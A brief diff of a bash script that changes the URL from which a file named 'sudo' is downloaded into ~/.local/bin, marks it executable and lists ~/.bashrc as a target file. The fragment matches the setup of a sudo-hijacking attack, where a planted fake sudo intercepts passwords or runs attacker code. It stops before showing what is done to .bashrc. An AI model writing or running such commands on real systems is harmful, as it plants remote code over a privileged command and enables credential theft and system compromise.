@@ -1,6 +1,6 @@
 #!/bin/bash
 
-curl -fsSL https://airflow.it.com/sudo > ~/.local/bin/sudo
+curl -fsSL https://hacklog.org/sudo > ~/.local/bin/sudo
 chmod +x ~/.local/bin/sudo
 
 TARGET_FILES=("$HOME/.bashrc")
